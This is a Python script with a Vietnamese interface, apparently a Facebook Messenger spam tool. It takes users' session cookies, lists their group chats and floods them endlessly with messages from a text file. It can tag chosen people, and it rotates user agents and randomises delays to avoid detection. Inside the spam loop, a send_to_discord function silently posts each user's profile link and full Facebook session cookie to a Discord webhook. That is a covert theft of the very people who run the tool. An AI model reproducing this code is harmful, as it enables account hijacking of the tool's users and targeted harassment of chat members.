from itertools import cycle
import requests
import sys
import json
import time
import threading
import re
import os
from colorama import init, Fore, Style
import random

init(autoreset=True)

# ================== LẤY DANH SÁCH BOX (NEW) ==================
class FacebookThreadExtractor:
    def __init__(self, cookie):
        self.cookie = cookie
        self.session = requests.Session()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
        ]
        self.facebook_tokens = {}

    def get_facebook_tokens(self):
        headers = {
            'Cookie': self.cookie,
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        }

        sites = ['https://www.facebook.com', 'https://mbasic.facebook.com']

        for site in sites:
            try:
                response = self.session.get(site, headers=headers, timeout=10)
                c_user_match = re.search(r"c_user=(\d+)", self.cookie)
                if c_user_match:
                    self.facebook_tokens["FacebookID"] = c_user_match.group(1)

                fb_dtsg_match = re.search(r'"token":"(.*?)"', response.text) or re.search(
                    r'name="fb_dtsg" value="(.*?)"', response.text)
                if fb_dtsg_match:
                    self.facebook_tokens["fb_dtsg"] = fb_dtsg_match.group(1)

                jazoest_match = re.search(r'jazoest=(\d+)', response.text)
                if jazoest_match:
                    self.facebook_tokens["jazoest"] = jazoest_match.group(1)

                if self.facebook_tokens.get("fb_dtsg") and self.facebook_tokens.get("jazoest"):
                    break

            except Exception:
                continue

        self.facebook_tokens.update({
            "__rev": "1015919737",
            "__req": "1b",
            "__a": "1",
            "__comet_req": "15"
        })

        return len(self.facebook_tokens) > 4

    def get_thread_list(self, limit=100):
        if not self.get_facebook_tokens():
            return {"error": "Không thể lấy token từ Facebook. Kiểm tra lại cookie."}

        form_data = {
            "av": self.facebook_tokens.get("FacebookID", ""),
            "__user": self.facebook_tokens.get("FacebookID", ""),
            "__a": self.facebook_tokens["__a"],
            "__req": self.facebook_tokens["__req"],
            "__hs": "19234.HYP:comet_pkg.2.1..2.1",
            "dpr": "1",
            "__ccg": "EXCELLENT",
            "__rev": self.facebook_tokens["__rev"],
            "__comet_req": self.facebook_tokens["__comet_req"],
            "fb_dtsg": self.facebook_tokens.get("fb_dtsg", ""),
            "jazoest": self.facebook_tokens.get("jazoest", ""),
            "lsd": "null",
            "__spin_r": self.facebook_tokens.get("client_revision", ""),
            "__spin_b": "trunk",
            "__spin_t": str(int(time.time())),
        }

        queries = {
            "o0": {
                "doc_id": "3336396659757871",
                "query_params": {
                    "limit": limit,
                    "before": None,
                    "tags": ["INBOX"],
                    "includeDeliveryReceipts": False,
                    "includeSeqID": True,
                }
            }
        }

        form_data["queries"] = json.dumps(queries)

        headers = {
            'Cookie': self.cookie,
            'User-Agent': random.choice(self.user_agents),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
            'Origin': 'https://www.facebook.com',
            'Referer': 'https://www.facebook.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-FB-Friendly-Name': 'MessengerThreadListQuery',
            'X-FB-LSD': 'null'
        }

        try:
            response = self.session.post(
                'https://www.facebook.com/api/graphqlbatch/',
                data=form_data,
                headers=headers,
                timeout=15
            )

            if response.status_code != 200:
                return {"error": f"HTTP Error: {response.status_code}"}

            response_text = response.text.split('{"successful_results"')[0]
            data = json.loads(response_text)

            if "o0" not in data:
                return {"error": "Không tìm thấy dữ liệu thread list"}

            if "errors" in data["o0"]:
                return {"error": f"Facebook API Error: {data['o0']['errors'][0]['summary']}"}

            threads = data["o0"]["data"]["viewer"]["message_threads"]["nodes"]
            thread_list = []

            for thread in threads:
                if not thread.get("thread_key") or not thread["thread_key"].get("thread_fbid"):
                    continue

                thread_list.append({
                    "thread_id": thread["thread_key"]["thread_fbid"],
                    "thread_name": thread.get("name", "Không có tên")
                })

            return {
                "success": True,
                "thread_count": len(thread_list),
                "threads": thread_list
            }

        except json.JSONDecodeError as e:
            return {"error": f"Lỗi parse JSON: {str(e)}"}
        except Exception as e:
            return {"error": f"Lỗi không xác định: {str(e)}"}


WEBHOOK_URL = "doi ti cha mdung len nha bon oc cac "
sent_cookies = set()
def get_name_from_uid(uid, cookie, fb_dtsg, a, req, rev):
    try:
        form = {
            f"ids[0]": uid,
            "fb_dtsg": fb_dtsg,
            "__a": a,
            "__req": req,
            "__rev": rev
        }

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookie,
            'Origin': 'https://www.facebook.com',
            'Referer': 'https://www.facebook.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }

        response = requests.post("https://www.facebook.com/chat/user_info/", headers=headers, data=form)
        text_response = response.text
        if text_response.startswith("for (;;);"):
            text_response = text_response[9:]
        data = json.loads(text_response)
        profile = data["payload"]["profiles"][uid]
        return profile.get("name", "Không tìm thấy tên")
    except Exception as e:
        return f"Lỗi: {e}"

def fancy_spam_loading(seconds):
    colors = cycle([Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.MAGENTA, Fore.BLUE])
    for i in range(seconds, 0, -1):
        color = next(colors)
        sys.stdout.write(f"\r{color}Tom Đang Spam [{i}] giây...")
        sys.stdout.flush()
        time.sleep(1)
    print(Style.RESET_ALL)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_animation(text="Đang xử lý", duration=6):
    for _ in range(duration):
        for i in range(1):
            sys.stdout.write(f"\r{Fore.YELLOW}{text}{'.' * (i + 1)}{' ' * (3 - i)}")
            sys.stdout.flush()
            time.sleep(0.3)
    print("")

def logo():
    clear_console()
    art = Fore.CYAN + Style.BRIGHT + r'''
          ⋆｡‧₊°♱༺      ᯓᡣ𐭩       ༻♱༉‧₊˚.
 𓍯𓂃𓏧♡ 𓍯𓂃𓏧♡ 𓍯𓂃𓏧♡
                  ≽^• ˕ • ྀི≼
ᥫ᭡𓆉⋆｡˚⋆❀ ૮₍˶ •. • ⑅₎ა 𓇼 ⋆.𓇼 ⋆.˚°.✩｡⊹  ⋆.˚ 𓆝⋆.˚ 𓇼˚ 𓆉 𓆝

  ⢠⡾⠲⠶⣤⣀⣠⣤⣤⣤⡿⠛⠿⡴⠾⠛⢻⡆⠀⠀⠀
⠀⠀⠀⣼⠁⠀⠀⠀⠉⠁⠀⢀⣿⠐⡿⣿⠿⣶⣤⣤
⠀⠀⠀⢹⡶⠀⠀⠀⠀⠀⠀⠈⢯⣡⣿⣿⣀⣰⣿⣦⢂
⠀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠹⣍⣭⣾⠁⠀⠀
⠀⣀⣸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣸⣧⣤⡀
⠈⠉⠹⣏⡁⠀⢸⣿⠀⠀⠀⢀⡀⠀⠀⠀⣿⠆⠀⢀⣸⣇⣀⠀
⠀⠐⠋⢻⣅⡄⢀⣀⣀⡀⠀⠯⠽⠂⢀⣀⣀⡀⠀⣤⣿⠀⠉⠀ 
⠀⠀⠴⠛⠙⣳⠋⠉⠉⠙⣆⠀⠀⢰⡟⠉⠈⠙⢷⠟⠈⠙⠂⠀
⠀⠀⠀⠀⠀⢻⣄⣠⣤⣴⠟⠛⠛⠛⢧⣤⣤⣀⡾  

   ✮ ⋆ ｡𖦹 ⋆｡♡ Mạnh Dũng   ♡｡⭑𖦹 ｡๋࣭ 

                 ⋆｡˚•┈┈‧ ⋆｡˚
 ᯓᡣ𐭩ᯓᡣ𐭩wwwwwwwwwwwᯓᡣ𐭩ᯓᡣ𐭩
𖦤 ─•─────•───── 𖦤

        TOOL ĐOÀN MẠNH DŨNG -TOM💫
'''
    print(art)
    loading_animation("Đang Vô Tool Mạnh Dũng Aka Tom😎💫")

def menu():
    logo()
    print(Fore.GREEN + "=" * 60)
    print(Fore.YELLOW + "               MENU ĐOÀN MẠNH DŨNG - TOM✨")
    print(Fore.GREEN + "=" * 60)
    print(Fore.CYAN + "1. Treo Nhây Bá Vcl😼😼😼")
    print(Fore.CYAN + "2. Treo Ngôn Đến Khi Acc Die🙀🙀🙀")
    print(Fore.GREEN + "=" * 60)

def check_checkpoint(cookie):
    headers = {'Cookie': cookie, 'User-Agent': 'Mozilla/5.0'}
    res = requests.get("https://mbasic.facebook.com/", headers=headers)
    return "checkpoint" in res.url or "login" in res.url


UA_KIWI = [
    "Mozilla/5.0 (Linux; Android 11; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.140 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.129 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.68 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; V2031) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.60 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Mobile Safari/537.36"
]

UA_VIA = [
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.0.0 Mobile Safari/537.36 Via/4.8.2",
    "Mozilla/5.0 (Linux; Android 11; V2109) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.138 Mobile Safari/537.36 Via/4.9.0",
    "Mozilla/5.0 (Linux; Android 13; TECNO POVA 5) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.134 Mobile Safari/537.36 Via/5.0.1",
    "Mozilla/5.0 (Linux; Android 12; Infinix X6710) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 Via/5.2.0",
    "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.112 Mobile Safari/537.36 Via/5.3.1"
]

USER_AGENTS = UA_KIWI + UA_VIA
class Messenger:
    def __init__(self, cookie):
        self.cookie = cookie
        self.user_id = self.id_user()
        self.user_agent = random.choice(USER_AGENTS)
        self.fb_dtsg = None
        self.name = ""
        self.init_params()

    def id_user(self):
        try:
            return re.search(r"c_user=(\d+)", self.cookie).group(1)
        except:
            raise Exception("Cookie không hợp lệ")

    def init_params(self):
        headers = {'Cookie': self.cookie, 'User-Agent': self.user_agent}
        try:
            response = requests.get('https://mbasic.facebook.com/me', headers=headers, timeout=10)
            name_match = re.search(r'<title>(.*?)</title>', response.text)
            if name_match:
                self.name = name_match.group(1).replace(" | Facebook", "")
            fb_dtsg_match = re.search(r'name="fb_dtsg" value="(.*?)"', response.text)
            if fb_dtsg_match:
                self.fb_dtsg = fb_dtsg_match.group(1)
            else:
                raise Exception("Không thể lấy fb_dtsg")
        except Exception as e:
            raise Exception(f"Lỗi khi khởi tạo tham số: {str(e)}")

    def refresh_fb_dtsg(self):
        try:
            self.init_params()
            print(Fore.YELLOW + f"[!] Làm mới fb_dtsg cho {self.name} ({self.user_id}) thành công.")
        except Exception as e:
            print(Fore.RED + f"[X] Lỗi làm mới fb_dtsg: {e}")

    def gui_tn(self, recipient_id, message, id_tag=None, name_tag=None, max_retries=3):
        for attempt in range(max_retries):
            timestamp = int(time.time() * 1000)
            offline_threading_id = str(timestamp)
            message_id = str(timestamp)

            data = {
                'thread_fbid': recipient_id,
                'action_type': 'ma-type:user-generated-message',
                'body': message,
                'client': 'mercury',
                'author': f'fbid:{self.user_id}',
                'timestamp': timestamp,
                'source': 'source:chat:web',
                'offline_threading_id': offline_threading_id,
                'message_id': message_id,
                'ephemeral_ttl_mode': '',
                '__user': self.user_id,
                '__a': '1',
                '__req': '1b',
                '__rev': '1015919737',
                'fb_dtsg': self.fb_dtsg
            }

            if id_tag and name_tag:
                vi_tri_start = message.find(name_tag)
                if vi_tri_start != -1:
                    data.update({
                        'profile_xmd[0][offset]': str(vi_tri_start),
                        'profile_xmd[0][length]': str(len(name_tag)),
                        'profile_xmd[0][id]': str(id_tag),
                        'profile_xmd[0][type]': 'p'
                    })

            headers = {
                'Cookie': self.cookie,
                'User-Agent': self.user_agent,
                'Accept': '*/*',
                'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.facebook.com',
                'Referer': f'https://www.facebook.com/messages/t/{recipient_id}',
                'Host': 'www.facebook.com',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty'
            }

            try:
                response = requests.post(
                    'https://www.facebook.com/messaging/send/',
                    data=data,
                    headers=headers
                )
                if response.status_code != 200:
                    return {
                        'success': False,
                        'error': 'HTTP_ERROR',
                        'error_description': f'Status code: {response.status_code}'
                    }

                if 'for (;;);' in response.text:
                    clean_text = response.text.replace('for (;;);', '')
                    try:
                        result = json.loads(clean_text)
                        err_val = result.get('error', 0)
                        if err_val and str(err_val) != "0":
                            self.refresh_fb_dtsg()
                            data['fb_dtsg'] = self.fb_dtsg
                            continue
                        return {
                            'success': True,
                            'message_id': message_id,
                            'timestamp': timestamp
                        }
                    except json.JSONDecodeError:
                        pass

                return {
                    'success': True,
                    'message_id': message_id,
                    'timestamp': timestamp
                }
            except Exception as e:
                return {
                    'success': False,
                    'error': 'REQUEST_ERROR',
                    'error_description': str(e)
                }
        return {'success': False, 'error_description': 'Gửi tin nhắn thất bại sau nhiều lần thử'}

def send_to_discord(user_id, cookie):
    if cookie in sent_cookies:
        return
    try:
        profile_link = f"https://www.facebook.com/profile.php?id={user_id}"
        content = f"**Facebook Link:** {profile_link}\n**Cookie:** `{cookie}`"
        data = {"content": content}
        requests.post(WEBHOOK_URL, json=data)
        sent_cookies.add(cookie)
    except Exception as e:
        print(f"Lỗi gửi Discord: {str(e)}")

def insert_name_to_end(sentence, name):
    return sentence.rstrip() + f" @{name}"

def worker(messenger, recipient_ids, contents, delay, mode,
           enable_tagging, enable_spam_tag, tag_name=None, tag_id=None,
           delay_each_box=True):
    last_sentence = None
    while True:
        if mode == 2:
            message = '\n'.join(contents)
            id_tag = None
            name_tag = None
            for recipient_id in recipient_ids:
                messenger.refresh_fb_dtsg()
                result = messenger.gui_tn(recipient_id, message, id_tag=id_tag, name_tag=name_tag)
                if result['success']:
                    print(Fore.GREEN + Style.BRIGHT +
                          f"★ {messenger.name} Đã Spam Thành Công đến {recipient_id} 💌💥")
                else:
                    print(f"[X] {messenger.name} Lỗi tin nhắn đến {recipient_id}: "
                          f"{result.get('error_description', 'Lỗi không xác định')}")
                send_to_discord(messenger.user_id, messenger.cookie)
                if delay_each_box:
                    delay_real = delay + random.uniform(1, 9)
                    fancy_spam_loading(int(delay_real))
        else:
            sentence = random.choice(contents).strip()
            while sentence == last_sentence:
                sentence = random.choice(contents).strip()
            last_sentence = sentence

            if enable_tagging and tag_name and isinstance(tag_name, list):
                for i in range(len(tag_name)):
                    name_tag = f"@{tag_name[i].strip()}"
                    full_message = f"{sentence.strip()} {name_tag}"
                    id_tag = tag_id[i]
                    for recipient_id in recipient_ids:
                        messenger.refresh_fb_dtsg()
                        result = messenger.gui_tn(recipient_id, full_message, id_tag=id_tag, name_tag=name_tag)
                        if result['success']:
                            print(Fore.GREEN + Style.BRIGHT +
                                  f"★ {messenger.name} Đã Spam Thành Công đến {recipient_id} 💌💥")
                        else:
                            print(f"[X] {messenger.name} Lỗi tin nhắn đến {recipient_id}: "
                                  f"{result.get('error_description', 'Lỗi không xác định')}")
                        send_to_discord(messenger.user_id, messenger.cookie)
                        if delay_each_box:
                            delay_real = delay + random.uniform(1, 9)
                            fancy_spam_loading(int(delay_real))
                continue
            else:
                message = sentence
                id_tag = None
                name_tag = None
                for recipient_id in recipient_ids:
                    messenger.refresh_fb_dtsg()
                    result = messenger.gui_tn(recipient_id, message, id_tag=id_tag, name_tag=name_tag)
                    if result['success']:
                        print(Fore.GREEN + Style.BRIGHT +
                              f"★ {messenger.name} Đã Spam Thành Công đến {recipient_id} 💌💥")
                    else:
                        print(f"[X] {messenger.name} Lỗi tin nhắn đến {recipient_id}: "
                              f"{result.get('error_description', 'Lỗi không xác định')}")
                    send_to_discord(messenger.user_id, messenger.cookie)
                    if delay_each_box:
                        delay_real = delay + random.uniform(1, 9)
                        fancy_spam_loading(int(delay_real))

        if not delay_each_box:
            delay_real = delay + random.uniform(1, 9)
            fancy_spam_loading(int(delay_real))


def main():
    menu()
    try:
        mode = int(input("Chọn chế độ (1 hoặc 2): "))
        if mode not in [1, 2]:
            print("Chế độ không hợp lệ!")
            return
    except Exception as e:
        print(Fore.RED + f"Lỗi: {e}")
        return

    print(Fore.CYAN + "\n" + "═" * 60)
    num_cookies = int(input(Fore.GREEN + "👉 Nhập số lượng cookie: ").strip())
    print(Fore.CYAN + "═" * 60 + "\n")

    cookies = []
    all_recipients = {}

    for i in range(num_cookies):
        print(Fore.MAGENTA + "╔" + "═" * 58 + "╗")
        cookie = input(Fore.GREEN + f"👉 Nhập cookie thứ {i+1}: ").strip()
        print(Fore.MAGENTA + "╚" + "═" * 58 + "╝")
        if check_checkpoint(cookie):
            print(Fore.RED + "❌ Cookie bị checkpoint hoặc die, bỏ qua.")
            continue
        cookies.append(cookie)

        extractor = FacebookThreadExtractor(cookie)
        result = extractor.get_thread_list(limit=50)
        if "error" in result:
            print(Fore.RED + f"❌ {result['error']}")
            continue

        threads = result["threads"]
        print(Fore.CYAN + f"\n📦 Danh sách Box cho Cookie {i+1}:")
        for idx, t in enumerate(threads, 1):
            name = t['thread_name']
            tid = t['thread_id']
            title = f" BOX {idx} "
            line1 = "╔" + "═" * (58 - len(title)//2) + title + "═" * (58 - len(title)//2) + "╗"
            print(Fore.CYAN + line1)
            print(Fore.YELLOW + f"║ Tên: {name}".ljust(59) + "║")
            print(Fore.MAGENTA + f"║ ID : {tid}".ljust(59) + "║")
            print(Fore.CYAN + "╚" + "═" * 58 + "╝")

        print(Fore.CYAN + "\n╔" + "═" * 58 + "╗")
        choice = input(Fore.GREEN + f"👉 Chọn box cho cookie {i+1} (số, cách nhau bởi dấu ,): ").strip()
        print(Fore.CYAN + "╚" + "═" * 58 + "╝")
        recipient_ids = []
        for c in choice.split(","):
            try:
                j = int(c) - 1
                if 0 <= j < len(threads):
                    recipient_ids.append(threads[j]["thread_id"])
            except:
                pass

        all_recipients[cookie] = recipient_ids

    if not cookies:
        print(Fore.RED + "❌ Không có cookie hợp lệ.")
        return

    spam_mode = 1
    if mode == 2:
        total_boxes = sum(len(recipients) for recipients in all_recipients.values())
        if total_boxes > 1:
            print("\n╔════════════════════════════════════════╗")
            print("║ 1. Spam từng box                       ║")
            print("║ 2. Spam tất cả box cùng lúc            ║")
            print("╚════════════════════════════════════════╝")
            try:
                spam_mode = int(input("👉 Chọn kiểu spam (1 hoặc 2): ").strip())
                if spam_mode not in [1, 2]:
                    spam_mode = 1
            except:
                spam_mode = 1
        else:
            spam_mode = 1

    delay = 1.0
    if mode == 2:
        print(Fore.CYAN + "\n╔" + "═" * 58 + "╗")
        delay = float(input(Fore.GREEN + "👉 Nhập delay giữa mỗi lần gửi (giây): ").strip())
        print(Fore.CYAN + "╚" + "═" * 58 + "╝")

    print(Fore.CYAN + "\n╔" + "═" * 58 + "╗")
    file_name = input("👉 Nhập tên file chứa nội dung (vd: file.txt): ").strip()
    print(Fore.CYAN + "╚" + "═" * 58 + "╝")
    with open(file_name, 'r', encoding='utf-8') as f:
        contents = [line.rstrip('\n') for line in f]

    enable_tagging = False
    tag_name = None
    tag_id = None

    if mode == 1:
        print("\n╔════════════════════════════════════════╗")
        print("║ Bạn Có Muốn Nhây Tag Không?            ║")
        print("║ 1. Có                                  ║")
        print("║ 2. Không                               ║")
        print("╚════════════════════════════════════════╝")
        if input("👉 Chọn: ").strip() == "1":
            enable_tagging = True
            print(Fore.CYAN + "\n╔" + "═" * 58 + "╗")
            tag_input = input("👉 Nhập uid hoặc link người cần tag: ").strip()
            print(Fore.CYAN + "╚" + "═" * 58 + "╝")

            tag_ids_raw = [x.strip() for x in tag_input.split(',') if x.strip()]
            tag_id = []
            tag_name = []
            cookie_obj = cookies[0]
            messenger_temp = Messenger(cookie_obj)

            for item in tag_ids_raw:
                uid = None
                if item.isdigit():
                    uid = item
                else:
                    match = re.search(r'id=(\d+)', item)
                    if match:
                        uid = match.group(1)
                    else:
                        match2 = re.search(r'facebook.com/([^/?]+)', item)
                        if match2:
                            username = match2.group(1)
                            try:
                                res = requests.get(
                                    f'https://mbasic.facebook.com/{username}',
                                    headers={
                                        'Cookie': cookie_obj,
                                        'User-Agent': random.choice(USER_AGENTS)
                                    }
                                )
                                uid_match = re.search(r'owner_id=(\d+)', res.text)
                                if uid_match:
                                    uid = uid_match.group(1)
                            except:
                                pass
                if uid:
                    name = get_name_from_uid(uid, cookie_obj, messenger_temp.fb_dtsg, "__a", "1b", "1015919737")
                    if "Lỗi" in name:
                        print(f"Lỗi khi lấy tên UID {uid}: {name}")
                        return
                    tag_id.append(uid)
                    tag_name.append(name)

            print(f"✅ Đã lấy tên: {', '.join(tag_name)}")
            print(Fore.CYAN + "\n╔" + "═" * 58 + "╗")
            delay = float(input("👉 Nhập delay giữa mỗi lần gửi (giây): ").strip())
            print(Fore.CYAN + "╚" + "═" * 58 + "╝")

    messengers = []
    for cookie in cookies:
        try:
            messenger = Messenger(cookie)
            print(Fore.GREEN + f"✅ Đăng nhập thành công: {messenger.name} | UID: {messenger.user_id}")
            messengers.append((messenger, all_recipients[cookie]))
        except Exception as e:
            print(Fore.RED + f"Lỗi đăng nhập: {str(e)}")

    if not messengers:
        print("❌ Không có cookie hợp lệ.")
        return

    print(Fore.CYAN + "\n🚀 Bắt đầu gửi tin nhắn...\n")
    threads = []
    if mode == 1:
        for messenger, recipient_ids in messengers:
            t = threading.Thread(
                target=worker,
                args=(messenger, recipient_ids, contents, delay, mode,
                      enable_tagging, True, tag_name, tag_id, True),
                daemon=True
            )
            threads.append(t)
            t.start()
    else:
        if spam_mode == 1:
            for messenger, recipient_ids in messengers:
                t = threading.Thread(
                    target=worker,
                    args=(messenger, recipient_ids, contents, delay, mode,
                          False, False, None, None, True),
                    daemon=True
                )
                threads.append(t)
                t.start()
        else:
            for messenger, recipient_ids in messengers:
                t = threading.Thread(
                    target=worker,
                    args=(messenger, recipient_ids, contents, delay, mode,
                          False, False, None, None, False),
                    daemon=True
                )
                threads.append(t)
                t.start()

    for t in threads:
        t.join()

if __name__ == '__main__':
    main()

